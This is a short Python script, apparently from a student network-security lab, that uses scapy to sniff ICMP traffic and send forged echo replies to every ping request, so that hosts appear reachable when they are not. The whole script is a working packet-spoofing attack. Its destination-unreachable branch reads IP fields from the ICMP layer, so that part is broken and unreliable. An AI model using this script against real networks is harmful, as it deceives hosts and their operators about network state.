from scapy.all import *

# The idea of copying the packet's payload came from the internet.
# Other than that all the code was writted by us.
def spoof(pkt):
	# if packet contains an ICMP header and its type field is set to 8 (ping-request).
	if ICMP in pkt and pkt[ICMP].type == 8:
		# IP:
		# Building the IP header with opposite drc and dst,
		# and ihl will be the same so copy it.
		print('Found a ping-request')
		ip = IP()
		ip.src = pkt[IP].dst
		ip.dst = pkt[IP].src
		ip.ihl = pkt[IP].ihl

		# ICMP: 
		# Build an ICMP obj with type='echo-reply'(0), matching seq number
		# and matching identifier.
		icmp = ICMP(type='echo-reply', seq=pkt[ICMP].seq, id=pkt[ICMP].id)
		data = pkt[Raw]

		p=(ip/icmp/data) # Create
		send(p, verbose=0) # Spoof!
		print(
        	'Packet Spoofed!\n\t' 
        	'Original packet: \n\t'
        	'Source: ', ip.dst, '\n\t' 
        	'Destination: ', ip.src, '\n\t---\n\t'
        	'Spoofed packet:\n\t'
        	'Source: ', ip.src, '\n\t'
        	'Destination: ', ip.dst, '\n'
        	'-----------------------------\n')


	elif pkt[ICMP].type == 3: # Dest-Unreachable
		print('Found a dest-unreach')
		ip = IP(src=pkt[ICMP].dst, dst=pkt[ICMP].src, ihl=pkt[ICMP].ihl)
		icmp = ICMP(type=0, seq=pkt[ICMP].seq, id=pkt[ICMP].id)
		p = ip/icmp
		send(p)
		print(
        	'Packet Spoofed!\n\t' 
        	'Original packet: \n\t'
        	'Source: ', ip.dst, '\n\t' 
        	'Destination: ', ip.src, '\n\t---\n\t'
        	'Spoofed packet:\n\t'
       		'Source: ', ip.src, '\n\t'
       		'Destination: ', ip.dst, '\n'
	        '-----------------------------\n')


print('Sniffing icmp packets...')
pkt = sniff(iface=['enp0s3', 'lo'], filter='icmp', prn=spoof)

